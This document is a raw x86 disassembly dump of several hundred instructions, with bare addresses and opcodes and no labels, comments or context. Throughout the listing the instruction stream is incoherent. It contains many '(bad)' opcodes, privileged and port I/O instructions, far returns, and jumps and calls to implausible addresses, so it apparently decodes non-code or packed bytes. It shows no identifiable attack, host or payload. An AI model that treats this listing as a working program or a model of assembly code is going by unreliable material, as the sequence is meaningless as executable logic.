  40ece0:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ece7:	rol    DWORD PTR [edx],0x8
  40ecea:	mov    esp,ecx
  40ecec:	cmp    DWORD PTR [ebx],0xc
  40ecef:	mov    esi,0x5001c0
  40ecf4:	push   eax
  40ecf5:	push   cs
  40ecf6:	push   eax
  40ecf7:	(bad)  
  40ecf8:	sub    edx,edi
  40ecfa:	push   esi
  40ecfb:	adc    al,0xcb
  40ecfd:	ins    DWORD PTR es:[edi],dx
  40ecfe:	mov    eax,0x203e8
  40ed03:	add    al,ah
  40ed05:	inc    esi
  40ed06:	mov    al,ch
  40ed08:	pop    es
  40ed09:	add    DWORD PTR [eax],0x1
  40ed0c:	add    dh,al
  40ed0e:	add    ah,ch
  40ed10:	rol    DWORD PTR [edx-0xd],1
  40ed13:	cli    
  40ed14:	push   0x4a
  40ed16:	pop    ecx
  40ed17:	retf   0xfe6
  40ed1a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ed20:	(bad)  
  40ed21:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ed27:	(bad)  
  40ed28:	sub    ebp,DWORD PTR [ebx]
  40ed2a:	and    al,0x52
  40ed2c:	(bad)  
  40ed2d:	dec    edi
  40ed2e:	inc    ebp
  40ed2f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ed36:	add    BYTE PTR [ebp-0x7b],dh
  40ed39:	pop    eax
  40ed3a:	add    BYTE PTR [edx+0x0],bl
  40ed3d:	pop    edx
  40ed3e:	dec    ebp
  40ed3f:	jmp    DWORD PTR [ebx]
  40ed41:	and    al,0xec
  40ed43:	push   edx
  40ed44:	out    0x64,eax
  40ed46:	jmp    0xd3f2e34b
  40ed4b:	jmp    0x40eda5
  40ed4d:	mov    al,0xfe
  40ed4f:	dec    BYTE PTR [ebp-0x18fd8018]
  40ed55:	add    BYTE PTR [esi+ebp*1],bh
  40ed58:	pop    edx
  40ed59:	icebp  
  40ed5a:	mov    eax,cs
  40ed5c:	ins    BYTE PTR es:[edi],dx
  40ed5d:	adc    eax,0x75510000
  40ed62:	mov    esi,0x70158
  40ed67:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ed6d:	mov    edi,esp
  40ed6f:	cld    
  40ed70:	jge    0x40ede7
  40ed72:	(bad)  
  40ed74:	aas    
  40ed75:	and    al,0x6d
  40ed77:	adc    cl,0x1
  40ed7a:	mov    eax,DWORD PTR [eax]
  40ed7c:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ed82:	dec    ebp
  40ed83:	add    eax,ebp
  40ed85:	add    BYTE PTR [edx],al
  40ed87:	fadd   DWORD PTR [eax]
  40ed89:	stc    
  40ed8a:	enter  0xee00,0x8b
  40ed8e:	sbb    eax,0x1
  40ed91:	sbb    esi,ecx
  40ed93:	in     al,0x0
  40ed95:	in     eax,dx
  40ed96:	add    BYTE PTR [eax],al
  40ed98:	jne    0x40ed25
  40ed9a:	cmp    edx,esp
  40ed9c:	jb     0x40eda7
  40ed9e:	jmp    0x40ee15
  40eda0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eda6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40edac:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40edb2:	jb     0x40ed3d
  40edb4:	pop    edx
  40edb5:	fadd   QWORD PTR [ebx-0x7445faa1]
  40edbb:	or     dh,BYTE PTR [edx+0x0]
  40edbe:	inc    edx
  40edbf:	or     dl,bh
  40edc1:	xlat   BYTE PTR ds:[ebx]
  40edc2:	dec    edx
  40edc3:	push   edi
  40edc4:	add    al,0x7
  40edc6:	leave  
  40edc7:	rol    DWORD PTR [edx+eax*1],0x7
  40edcb:	add    ecx,ecx
  40edcd:	mov    edx,ecx
  40edcf:	int3   
  40edd0:	jmp    0x40ed90
  40edd2:	mov    al,0x0
  40edd4:	(bad)  
  40edd5:	jne    0x40edbf
  40edd7:	mov    eax,DWORD PTR [edx]
  40edd9:	call   0xc1556ade
  40edde:	pop    edi
  40eddf:	add    ebx,DWORD PTR [ecx-0x37]
  40ede2:	pop    ecx
  40ede3:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40edea:	push   es
  40edeb:	mov    eax,DWORD PTR [eax]
  40eded:	int3   
  40edee:	add    ch,al
  40edf0:	jae    0x40edda
  40edf2:	int    0x1
  40edf4:	enter  0x3000,0x18
  40edf8:	add    BYTE PTR [ebp+0x75],al
  40edfb:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ee01:	push   0x2
  40ee03:	pop    ecx
  40ee04:	add    BYTE PTR [eax],cl
  40ee06:	push   ebx
  40ee07:	lea    edi,[edi+eax*2]
  40ee0a:	mov    al,0x1
  40ee0c:	jb     0x40ee0e
  40ee0e:	mov    al,0x10
  40ee10:	push   eax
  40ee11:	add    al,0x75
  40ee13:	add    BYTE PTR [ebx],ch
  40ee15:	add    ebx,esp
  40ee17:	int3   
  40ee18:	jne    0x40ee2a
  40ee1a:	movsx  edx,cl
  40ee1d:	add    DWORD PTR [eax],eax
  40ee1f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ee26:	mov    gs,edi
  40ee28:	add    BYTE PTR [eax-0x50],ch
  40ee2b:	add    al,ch
  40ee2d:	mov    eax,DWORD PTR [ecx]
  40ee2f:	sub    eax,DWORD PTR [eax]
  40ee31:	jb     0x40eea8
  40ee33:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ee37:	jge    0x40ee21
  40ee39:	add    al,0x1
  40ee3b:	add    DWORD PTR [eax],0x0
  40ee3e:	jne    0x40ee40
  40ee40:	je     0x40ee87
  40ee42:	mov    eax,DWORD PTR [edi]
  40ee44:	ror    BYTE PTR [ebp+0x4d],1
  40ee47:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ee4e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ee54:	mov    DWORD PTR [ebx],ebp
  40ee56:	fadd   DWORD PTR [eax+0x75]
  40ee59:	inc    eax
  40ee5a:	pop    eax
  40ee5b:	lea    ebx,[ecx+0x4f]
  40ee5e:	push   0xb1000003
  40ee63:	out    dx,eax
  40ee64:	add    ebp,DWORD PTR [edx+edx*2]
  40ee67:	add    BYTE PTR [ebx+ecx*4],bh
  40ee6a:	mov    ch,BYTE PTR [ebx]
  40ee6c:	jb     0x40eee0
  40ee6e:	add    al,0x89
  40ee70:	push   eax
  40ee71:	call   0x84293be3
  40ee76:	add    DWORD PTR [eax+eax*1],eax
  40ee79:	jae    0x40ee8f
  40ee7b:	icebp  
  40ee7c:	inc    ebp
  40ee7d:	mov    eax,DWORD PTR gs:[ecx]
  40ee80:	int3   
  40ee81:	out    dx,al
  40ee82:	loopne 0x40eed1
  40ee84:	sub    eax,DWORD PTR [edx]
  40ee86:	push   0xffffff83
  40ee88:	pop    esi
  40ee89:	push   cs
  40ee8a:	jl     0x40eea5
  40ee8c:	add    al,0xaf
  40ee8e:	xor    eax,0x832b6d00
  40ee93:	mov    eax,DWORD PTR [edx]
  40ee95:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40ee9b:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40eea1:	inc    ebp
  40eea2:	shr    ebx,0x3
  40eea5:	or     DWORD PTR [eax],0x4
  40eea8:	push   0xffffffa5
  40eeaa:	pop    esi
  40eeab:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40eeb2:	jmp    0x40ef11
  40eeb4:	mov    edi,0xff0272
  40eeb9:	fdivr  QWORD PTR [ebp+0x5d]
  40eebc:	push   0x4e
  40eebe:	pop    ecx
  40eebf:	call   0x4132c4
  40eec4:	mov    DWORD PTR [ebx],eax
  40eec6:	in     al,0xc8
  40eec8:	rol    BYTE PTR [ebp-0x75],0xc1
  40eecc:	call   0xaaf0ad
  40eed1:	pop    esi
  40eed2:	enter  0xceff,0x8b
  40eed6:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eeda:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40eee1:	je     0x40eee3
  40eee3:	or     DWORD PTR [ebx-0x74183b24],eax
  40eee9:	jne    0x40eecf
  40eeeb:	jmp    0x40eee6
  40eeed:	push   DWORD PTR [edx-0x24]
  40eef0:	push   0x4d
  40eef2:	pop    ecx
  40eef3:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40eef7:	jge    0x40eeff
  40eef9:	mov    eax,eax
  40eefb:	sub    ebp,DWORD PTR [edx+0x24]
  40eefe:	pop    esi
  40eeff:	inc    ebp
  40ef00:	mov    esp,0x8b6077
  40ef05:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40ef0b:	lods   al,BYTE PTR ds:[esi]
  40ef0c:	add    BYTE PTR [ebx],bh
  40ef0e:	enter  0xce73,0x49
  40ef12:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40ef1a:	stc    
  40ef1b:	jge    0x40ef8f
  40ef1d:	jnp    0xdd40727e
  40ef23:	call   0xc3eff9
  40ef28:	fadd   st(0),st
  40ef2a:	dec    esi
  40ef2b:	ins    BYTE PTR es:[edi],dx
  40ef2c:	stc    
  40ef2d:	cmp    al,0x73
  40ef2f:	push   ebp
  40ef30:	mov    eax,0xf8028b
  40ef35:	jne    0x40eef8
  40ef37:	mov    esi,ecx
  40ef39:	mov    esp,DWORD PTR [ebp+0x2c]
  40ef3c:	add    edi,DWORD PTR [ebp-0x24]
  40ef3f:	sub    esp,eax
  40ef41:	and    al,0x45
  40ef43:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40ef49:	sbb    al,0xee
  40ef4b:	pop    esi
  40ef4c:	call   0x80ef7c
  40ef51:	fsubr  st,st(3)
  40ef53:	sti    
  40ef54:	add    BYTE PTR gs:[ecx],bh
  40ef57:	add    eax,esp
  40ef59:	add    DWORD PTR [esi],eax
  40ef5b:	rol    DWORD PTR [ebp+0x8],0x29
  40ef5f:	mov    esp,eax
  40ef61:	clc    
  40ef62:	jne    0x40efd9
  40ef64:	mov    eax,0x8b0673
  40ef69:	loopne 0x40efb0
  40ef6b:	loopne 0x40eef6
  40ef6d:	lods   al,BYTE PTR ds:[esi]
  40ef6e:	int3   
  40ef6f:	inc    ebp
  40ef70:	mov    DWORD PTR gs:[eax+edi*8],eax
  40ef74:	add    al,0xc3
  40ef76:	sub    ecx,DWORD PTR [ebp+0x47]
  40ef79:	(bad)  
  40ef7b:	shr    BYTE PTR [ebp-0x1f],0xe8
  40ef7f:	add    eax,DWORD PTR [eax]
  40ef81:	call   0x642b086
  40ef86:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40ef8c:	dec    esi
  40ef8d:	ins    DWORD PTR es:[edi],dx
  40ef8e:	in     al,dx
  40ef8f:	lea    eax,[eax]
  40ef91:	inc    ebp
  40ef92:	inc    ebp
  40ef93:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40ef99:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40efa3:	and    al,0xdc
  40efa5:	ror    DWORD PTR [edx+0x24],0xf7
  40efa9:	or     BYTE PTR [ebp+0x4c],dh
  40efac:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40efb0:	stos   BYTE PTR es:[edi],al
  40efb1:	adc    edx,edi
  40efb3:	inc    esp
  40efb4:	add    edi,DWORD PTR [eax]
  40efb6:	jne    0x40ef9b
  40efb8:	mov    DWORD PTR [eax-0x7449db04],ecx
  40efbe:	cmp    ecx,DWORD PTR [edi]
  40efc0:	sub    BYTE PTR [ebp-0x7e],dl
  40efc3:	sar    ebp,0xb
  40efc6:	jmp    FWORD PTR [edi+0x2400392a]
  40efcc:	sub    esi,DWORD PTR [ebx-0x73]
  40efcf:	mov    esp,DWORD PTR [ecx+edi*4]
  40efd2:	mov    ecx,DWORD PTR [eax]
  40efd4:	and    BYTE PTR [eax],al
  40efd6:	jne    0x40efa2
  40efd8:	sub    ebp,ecx
  40efda:	sbb    BYTE PTR [esi+0x32],ah
  40efdd:	dec    ebp
  40efde:	push   ebp
  40efdf:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40efe5:	ret    
  40efe6:	mov    edx,ebp
  40efe8:	leave  
  40efe9:	sub    DWORD PTR [esi+0x24],ebx
  40efec:	ret    0x2b
  40efef:	pop    ax
  40eff1:	push   ebp
  40eff2:	rol    BYTE PTR [ebx],0xeb
  40eff5:	add    DWORD PTR [ecx+0x6c0001],0x40
  40effc:	jb     0x40f053
  40effe:	ret    
  40efff:	in     al,dx
  40f000:	jecxz  0x40ef8d
  40f002:	push   esi
  40f003:	xchg   esp,eax
  40f004:	jne    0x40f006
  40f006:	cmp    edx,DWORD PTR [esi+0x1c]
  40f009:	jne    0x40efef
  40f00b:	mov    eax,DWORD PTR [ebp-0x77]
  40f00e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f015:	mov    esi,DWORD PTR [ebp-0x75]
  40f018:	pop    esi
  40f019:	nop
  40f01a:	mov    eax,DWORD PTR [eax]
  40f01c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f022:	add    al,0x0
  40f024:	inc    ebp
  40f025:	mov    eax,DWORD PTR [ebx]
  40f027:	mov    ebp,ebx
  40f029:	cmp    al,0xf
  40f02b:	or     al,al
  40f02d:	inc    ebp
  40f02e:	inc    ebp
  40f02f:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  40f035:	cld    
  40f036:	add    BYTE PTR [edi+0x546c16c0],dh
  40f03c:	add    BYTE PTR [ecx-0x5],dl
  40f03f:	add    eax,0x17200
  40f044:	sbb    al,0x85
  40f046:	dec    esp
  40f047:	je     0x40f081
  40f049:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f04d:	add    BYTE PTR [ebx],bh
  40f04f:	(bad)  
  40f050:	and    al,0x32
  40f052:	jae    0x40eff0
  40f054:	mov    cl,cl
  40f056:	inc    DWORD PTR [esp]
  40f059:	push   ebp
  40f05a:	shr    esp,0x8
  40f05d:	in     al,dx
  40f05e:	push   esp
  40f05f:	add    DWORD PTR [eax],esp
  40f061:	add    bl,cl
  40f063:	inc    ebp
  40f064:	mov    bh,0x53
  40f066:	add    BYTE PTR [ebp-0x17],al
  40f069:	push   esi
  40f06a:	cmovne ecx,edx
  40f06d:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f071:	push   edi
  40f072:	pop    ss
  40f073:	xor    ecx,ebx
  40f075:	pushf  
  40f076:	add    BYTE PTR [ecx+0x452bf800],cl
  40f07c:	rcr    ecx,0x5
  40f07f:	inc    ebp
  40f080:	add    edx,ebx
  40f082:	add    BYTE PTR [ebp-0x40],al
  40f085:	out    0x6c,eax
  40f087:	inc    ebp
  40f088:	inc    eax
  40f089:	sub    eax,0x450546c1
  40f08e:	dec    esp
  40f08f:	sub    al,0x20
  40f091:	inc    ebp
  40f092:	fnstcw WORD PTR [esi+0x29]
  40f095:	leave  
  40f096:	add    BYTE PTR [esi+0xc000c0],bh
  40f09c:	lea    eax,[esp-0x40]
  40f0a0:	ret    
  40f0a1:	mov    dh,0x8b
  40f0a3:	xor    edx,DWORD PTR [ecx+0x3]
  40f0a6:	mov    al,BYTE PTR [ecx+0x1]
  40f0a9:	sbb    BYTE PTR [eax],al
  40f0ab:	stc    
  40f0ac:	mov    esi,DWORD PTR [edx+0x8]
  40f0af:	(bad)  
  40f0b0:	ss mov eax,0xb98ac631
  40f0b6:	add    esi,eax
  40f0b8:	add    BYTE PTR [edx-0x444d39f7],bh
  40f0be:	add    esi,eax
  40f0c0:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  40f0c7:	mov    BYTE PTR [eax],0xbe
  40f0ca:	or     BYTE PTR [ebx],dh
  40f0cc:	dec    ecx
  40f0cd:	lea    eax,[ebx]
  40f0cf:	or     eax,0x18fc0fc7
  40f0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d5:	(bad)  
  40f0d7:	fiadd  WORD PTR [ebp-0x78]
  40f0da:	jae    0xed75f829
  40f0e0:	or     BYTE PTR [ebp+0x7],al
  40f0e3:	in     eax,dx
  40f0e4:	fwait
  40f0e5:	inc    ebp
  40f0e6:	xor    ah,dh
  40f0e8:	pop    esi
  40f0e9:	inc    ebp
  40f0ea:	shl    edx,0xc
  40f0ed:	inc    ebp
  40f0ee:	sub    cl,0x1
  40f0f1:	inc    ebp
  40f0f2:	add    bh,bl
  40f0f4:	add    BYTE PTR [ebp-0x7b],al
  40f0f7:	out    dx,al
  40f0f8:	clc    
  40f0f9:	inc    ebp
  40f0fa:	ret    0xe7
  40f0fd:	inc    ebp
  40f0fe:	mov    edi,DWORD PTR [esi-0x7f]
  40f101:	leave  
  40f102:	and    al,0x44
  40f104:	add    BYTE PTR [eax+0x331cb68b],dh
  40f10a:	mov    DWORD PTR [ebx],eax
  40f10c:	sbb    al,0x41
  40f10e:	(bad)  
  40f10f:	sbb    al,ah
  40f111:	stc    
  40f112:	test   DWORD PTR [edx-0x8],esi
  40f115:	lea    edi,[edi-0x7007a98]
  40f11b:	mov    DWORD PTR [ebp-0x2c],edi
  40f11e:	(bad)  
  40f11f:	dec    ebp
  40f120:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  40f127:	add    edx,eax
  40f129:	(bad)  
  40f12a:	(bad)  
  40f12b:	inc    ebx
  40f12d:	jmp    FWORD PTR [edx-0x38]
  40f130:	(bad)  
  40f131:	or     al,ah
  40f133:	jge    0x40f0fb
  40f135:	mov    ebp,0x5a8533e4
  40f13b:	clc    
  40f13c:	enter  0x45,0x8b
  40f140:	lea    ecx,[ebp+ecx*1+0x18330f00]
  40f147:	mov    edi,0x7de08da
  40f14c:	mov    BYTE PTR [ebx+0x39063283],bl
  40f152:	in     eax,dx
  40f153:	cmovne edx,ebx
  40f156:	jmp    0x40f158
  40f158:	inc    ebp
  40f159:	mov    ebp,ebp
  40f15b:	sbb    al,0x45
  40f15d:	mov    ebx,ebx
  40f15f:	add    DWORD PTR [ebp+0x0],eax
  40f162:	in     al,dx
  40f163:	add    DWORD PTR [ebp+0x4d],eax
  40f166:	sub    eax,0x2c80458b
  40f16b:	add    BYTE PTR [ebp-0x77],al
  40f16e:	jle    0x40f1da
  40f170:	leave  
  40f171:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6e6
  40f179:	inc    ebp
  40f17a:	add    ebx,edi
  40f17c:	inc    ecx
  40f17d:	out    0x18,eax
  40f17f:	(bad)  
  40f180:	stc    
  40f181:	int3   
  40f182:	jb     0x40f10e
  40f184:	(bad)  
  40f185:	xor    dh,BYTE PTR [eax-0x4ec73980]
  40f18b:	or     dh,al
  40f18d:	dec    esi
  40f18e:	mov    dl,0xf3
  40f190:	mov    BYTE PTR [ebp-0x4d],0x89
  40f194:	(bad)  
  40f195:	loopne 0x40f14b
  40f197:	inc    esi
  40f199:	lea    esi,[ebp-0x49003924]
  40f19f:	push   eax
  40f1a0:	mov    BYTE PTR [ebp-0x49],0x33
  40f1a4:	xor    eax,DWORD PTR [ebx]
  40f1a6:	lea    edx,[eax+0xd]
  40f1a9:	inc    ebp
  40f1aa:	jae    0x8c1b57c8
  40f1b0:	ficomp WORD PTR [eax+ecx*4]
  40f1b3:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f1ba:	test   esi,edi
  40f1bc:	(bad)  
  40f1bd:	(bad)  
  40f1be:	inc    DWORD PTR [eax]
  40f1c0:	inc    ebp
  40f1c1:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  40f1c7:	test   DWORD PTR [ebx],edx
  40f1c9:	jne    0x40f154
  40f1cb:	or     DWORD PTR [ebx-0xed9771],0x75703b8e
  40f1d5:	jmp    0x124f263
  40f1da:	inc    ebp
  40f1db:	jne    0x40f1c9
  40f1dd:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  40f1e4:	mov    BYTE PTR [ebp+0x45009c01],cl
  40f1ea:	shl    BYTE PTR [eax],0x54
  40f1ed:	push   cx
  40f1ef:	mov    bx,0x7245
  40f1f3:	gs add bh,al
  40f1f6:	add    DWORD PTR [ebp+eax*4+0xe601df],ebx
  40f1fd:	inc    ebp
  40f1fe:	dec    ebp
  40f1ff:	int3   
  40f200:	mov    esp,ebx
  40f202:	jl     0x40f1cb
  40f204:	add    BYTE PTR [ecx+ecx*4+0x1ce28bdb],ah
  40f20b:	inc    ebp
  40f20c:	mov    edi,ebx
  40f20e:	add    ebp,esp
  40f210:	add    BYTE PTR [esi+0x1],ah
  40f213:	inc    ebp
  40f214:	or     BYTE PTR [edi],bh
  40f216:	inc    ebp
  40f217:	(bad)  
  40f218:	in     eax,dx
  40f219:	fsubr  st(2),st
  40f21b:	inc    edi
  40f21d:	add    dl,al
  40f21f:	add    dh,ch
  40f221:	call   0x860aa4
  40f226:	pop    esi
  40f227:	test   DWORD PTR [eax],ecx
  40f229:	dec    dl
  40f22b:	(bad)  
  40f22c:	jmp    0x413f7ab6
  40f231:	push   DWORD PTR [ebp-0x75]
  40f234:	(bad)  
  40f235:	loopne 0x40f203
  40f237:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  40f241:	push   eax
  40f242:	inc    DWORD PTR [ebp-0x75]
  40f245:	mov    esp,eax
  40f247:	cwde   
  40f248:	mov    DWORD PTR [eax],0xff8bffc3
  40f24e:	sbb    al,0x8
  40f250:	ror    BYTE PTR [ebp+0x50],0x51
  40f254:	inc    ebp
  40f255:	ror    BYTE PTR [ebx+0x65987d],1
  40f25b:	test   edi,eax
  40f25d:	add    al,0xdc
  40f25f:	add    bh,bh
  40f261:	push   0x1
  40f263:	add    BYTE PTR [eax],al
  40f265:	mov    edi,edi
  40f267:	inc    WORD PTR [ebp+0x8]
  40f26b:	add    eax,0xd
  40f26e:	(bad)  
  40f270:	xor    eax,0x782ec89
  40f275:	push   ecx
  40f276:	cli    
  40f277:	popw   es
  40f279:	push   ebp
  40f27a:	xchg   BYTE PTR [ebx-0x76740800],al
  40f280:	sbb    al,0x86
  40f282:	test   DWORD PTR [ecx-0x2],edx
  40f285:	call   WORD PTR [ebp-0x40]
  40f289:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  40f28d:	mov    eax,ebx
  40f28f:	mov    dh,BYTE PTR ds:0xc7666851
  40f295:	push   ebp
  40f296:	fsub   QWORD PTR [esi+0x0]
  40f299:	dec    ebp
  40f29a:	inc    ebp
  40f29b:	mov    edx,0xea4ece
  40f2a0:	(bad)  
  40f2a1:	retf   0x89a0
  40f2a4:	fist   DWORD PTR [eax+0x454ae1]
  40f2aa:	call   0xc7a72f3a
  40f2af:	mov    ch,0xa8
  40f2b1:	jmp    eax
  40f2b3:	(bad)  
  40f2b4:	in     eax,dx
  40f2b5:	lock (bad) 
  40f2b7:	mov    DWORD PTR [esi+ebp*2-0x727a0082],ebp
  40f2be:	(bad)  
  40f2bf:	xor    eax,0x700089ff
  40f2c4:	add    bh,bh
  40f2c6:	stos   DWORD PTR es:[edi],eax
  40f2c7:	data16 add BYTE PTR [ebp-0x1b0077],al
  40f2ce:	inc    DWORD PTR [ecx-0x73]
  40f2d1:	data16 fadd QWORD PTR [ebp-0xaf0001]
  40f2d8:	inc    ebp
  40f2d9:	shl    BYTE PTR [ebx],0x66
  40f2dc:	add    eax,DWORD PTR [ebp-0xba00b0]
  40f2e2:	add    DWORD PTR [ecx+0x44],0x66
  40f2e6:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  40f2ec:	add    DWORD PTR [ecx-0xcf8600],ecx
  40f2f2:	push   ebp
  40f2f3:	lea    dx,[ebp-0x28]
  40f2fa:	add    BYTE PTR [ebp-0x25],0xf
  40f2fe:	jge    0xff41f205
  40f304:	mov    ecx,0xc34fc7
  40f309:	rol    ecx,0x89
  40f30c:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  40f310:	ror    BYTE PTR [ebx-0x48990775],0x55
  40f317:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  40f31e:	test   BYTE PTR [ecx-0x3f997f3e],cl
  40f324:	push   ebp
  40f325:	mov    DWORD PTR [ebp-0x76761880],ecx
  40f32b:	or     BYTE PTR [eax+0x6600c265],0x45
  40f332:	push   ebp
  40f333:	xor    DWORD PTR [ebp-0x76381e64],ecx
  40f339:	aam    0x8c
  40f33b:	test   DWORD PTR [ecx-0x3dba7108],ecx
  40f341:	cmp    eax,0xc78b9c00
  40f346:	data16 hlt 
  40f348:	dec    ebp
  40f349:	test   DWORD PTR [ecx+0x454ff8],edi
  40f34f:	xor    ecx,esi
  40f351:	lahf   
  40f352:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  40f358:	mov    eax,DWORD PTR [ecx]
  40f35a:	data16 add BYTE PTR [ebp-0x7400bb],dh
  40f361:	sbb    al,0x71
  40f363:	dec    ebp
  40f364:	mov    si,WORD PTR [ebp-0xff0074]
  40f36b:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  40f371:	add    BYTE PTR [ebp-0x760fd877],cl
  40f377:	jne    0x40f3ed
  40f379:	test   edi,edi
  40f37b:	jne    0x40f300
  40f37d:	(bad)  
  40f37e:	sti    
  40f37f:	sbb    BYTE PTR [ecx-0x1789ab],cl
  40f385:	cld    
  40f386:	(bad)  
  40f387:	jmp    DWORD PTR [ecx]
  40f389:	inc    ebp
  40f38a:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  40f390:	data16 cmp al,0x8d
  40f393:	push   cs
  40f394:	inc    DWORD PTR [ebp-0x1]
  40f397:	test   DWORD PTR [ecx-0x838c],ecx
  40f39d:	sbb    al,0x8b
  40f39f:	lock clc 
  40f3a1:	push   DWORD PTR [edi-0xe39375]
  40f3a7:	xor    BYTE PTR [ebx],0x1
  40f3aa:	add    eax,DWORD PTR [eax]
  40f3ac:	xor    eax,DWORD PTR [eax]
  40f3ae:	mov    WORD PTR [ebp-0xba003d],0x4575
  40f3b7:	mov    ecx,DWORD PTR [edi]
  40f3b9:	sbb    al,0x4d
  40f3bb:	mov    DWORD PTR [ebx],esi
  40f3bd:	add    DWORD PTR [ebx],eax
  40f3bf:	add    BYTE PTR [ebx],dh
  40f3c1:	xor    DWORD PTR [esi-0x80],esp
  40f3c4:	inc    ebp
  40f3c5:	add    DWORD PTR [ebx],esi
  40f3c7:	add    BYTE PTR [esi+0x50],ah
  40f3ca:	inc    ebp
  40f3cb:	jmp    0x85f636
  40f3d0:	add    DWORD PTR [eax+0xc70194],0xffffffec
  40f3d7:	or     BYTE PTR [ebp+0x4501f845],dh
  40f3dd:	jmp    0xdcf6d3
  40f3e2:	(bad)  
  40f3e3:	push   cs
  40f3e4:	in     al,0xc9
  40f3e6:	test   DWORD PTR [ebp+0x4502f8],eax
  40f3ec:	xor    ecx,DWORD PTR [ebp-0x64]
  40f3ef:	mov    eax,edi
  40f3f1:	mov    esp,esp
  40f3f3:	push   eax
  40f3f4:	add    eax,0x45fff885
  40f3f9:	dec    DWORD PTR [ebx+0x339445]
  40f3ff:	add    ecx,DWORD PTR [ecx+0x452ce889]
  40f405:	dec    DWORD PTR [ebx-0x4e0be375]
  40f40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f40c:	add    edi,edi
  40f40e:	add    bh,bh
  40f410:	push   cs
  40f411:	xor    eax,DWORD PTR [eax+0x890103]
  40f417:	xor    BYTE PTR [ebp-0x1],al
  40f41a:	mov    DWORD PTR [ebp-0x36df38],ecx
  40f420:	push   cs
  40f421:	push   eax
  40f422:	jne    0x40f469
  40f424:	mov    esi,DWORD PTR [ebx]
  40f426:	sbb    al,0x3
  40f428:	jne    0x40f47a
  40f42a:	inc    DWORD PTR [ebp-0x75]
  40f42d:	add    eax,0x800f0
  40f432:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  40f438:	mov    DWORD PTR [ecx],eax
  40f43a:	sbb    BYTE PTR [eax],al
  40f43c:	leave  
  40f43d:	test   DWORD PTR [edi-0x1],eax
  40f440:	jne    0x40f441
  40f442:	call   0xff41df47
  40f447:	xor    BYTE PTR [ebp+0x4d],al
  40f44a:	mov    edi,edi
  40f44c:	enter  0x8,0x4d
  40f450:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  40f456:	mov    eax,DWORD PTR [eax]
  40f458:	sbb    al,0x1
  40f45a:	sbb    DWORD PTR [ebp+0x4d],eax
  40f45d:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  40f463:	inc    eax
  40f464:	dec    DWORD PTR [ecx-0x27d775]
  40f46a:	add    BYTE PTR [ebx-0x38d72b01],cl
  40f470:	xchg   ecx,eax
  40f471:	ret    
  40f472:	add    BYTE PTR [ebp-0x830075],al
  40f478:	add    BYTE PTR [ebp-0x75],al
  40f47b:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  40f481:	lea    edi,[edi+0x20]
  40f484:	add    bh,bh
  40f486:	mov    edx,DWORD PTR [eax-0x7b]
  40f489:	inc    ebp
  40f48a:	rdpmc  
  40f48c:	jne    0x40f491
  40f48e:	add    BYTE PTR [eax-0x75],dl
  40f491:	inc    ebp
  40f492:	call   0x4040fd9c
  40f497:	add    BYTE PTR [ecx-0xe3d775],cl
  40f49d:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  40f4a4:	ret    
  40f4a5:	inc    DWORD PTR [ebp-0xff0001]
  40f4ab:	add    BYTE PTR [ebp-0x4b],al
  40f4ae:	cmp    edi,0x24
  40f4b1:	(bad)  
  40f4b2:	push   DWORD PTR [eax]
  40f4b4:	add    BYTE PTR [ebp-0x39],dl
  40f4b7:	test   ebx,eax
  40f4b9:	je     0x40f440
  40f4bb:	mov    edi,edi
  40f4bd:	sbb    bh,bh
  40f4bf:	test   DWORD PTR gs:[eax],eax
  40f4c2:	(bad)  
